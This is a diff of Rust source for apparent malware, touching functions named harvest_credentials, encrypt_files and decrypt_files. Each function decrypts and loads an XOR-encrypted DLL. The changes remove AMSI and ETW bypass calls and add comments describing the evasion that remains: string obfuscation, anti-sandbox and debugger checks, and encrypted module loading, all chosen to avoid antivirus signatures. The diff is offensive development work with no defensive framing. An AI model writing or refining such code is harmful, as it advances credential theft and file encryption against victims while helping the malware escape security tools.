@@ -1015,19 +1015,13 @@ fn harvest_credentials() -> String {
         debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
         // === EVASION STRATEGY ===
-        // Note: Direct AMSI/ETW patching removed as it's heavily signatured
-        // Modern evasion relies on:
-        // 1. String obfuscation (obfstr) throughout the code
-        // 2. Anti-sandbox checks (production mode)
-        // 3. Legitimate Windows API usage
-        // 4. DLL encryption and secure loading
-        debug_print!("DEBUG: [EVASION] Using passive evasion techniques...");
-        unsafe {
-            // These now just return true (no-op for compatibility)
-            let _ = evasion::bypass_amsi();
-            let _ = evasion::bypass_etw();
-        }
-        debug_print!("DEBUG: [EVASION] ✅ Evasion configured");
+        // No aggressive patching (removed AMSI/ETW bypass to avoid AV signatures)
+        // Evasion is achieved through:
+        // 1. String obfuscation (obfstr) - all sensitive strings encrypted
+        // 2. Anti-sandbox checks - comprehensive VM/debugger detection (production mode)
+        // 3. Encrypted DLL loading - module is XOR encrypted
+        // 4. Legitimate Windows APIs - no suspicious memory operations
+        debug_print!("DEBUG: [EVASION] Using passive evasion techniques");
         
         // SIMPLIFICADO: LoadLibrary directo (más confiable)
         use std::os::raw::c_char;
@@ -1210,13 +1204,8 @@ fn encrypt_files(params: &str) -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
-        // Evasion (passive techniques)
-        debug_print!("DEBUG: [EVASION] Using passive evasion techniques...");
-        unsafe {
-            let _ = evasion::bypass_amsi();
-            let _ = evasion::bypass_etw();
-        }
-        debug_print!("DEBUG: [EVASION] ✅ Evasion configured");
+        // Evasion: passive techniques only (no aggressive patching)
+        debug_print!("DEBUG: [EVASION] Using passive evasion techniques");
         
         // Cargar DLL
         use std::os::raw::c_char;
@@ -1359,11 +1348,8 @@ fn decrypt_files(params: &str) -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
-        // Evasion (passive techniques)
-        unsafe {
-            evasion::bypass_amsi();
-            evasion::bypass_etw();
-        }
+        // Evasion: passive techniques only
+        // No aggressive patching to avoid AV detection
         
         // Cargar DLL
         use std::os::raw::c_char;
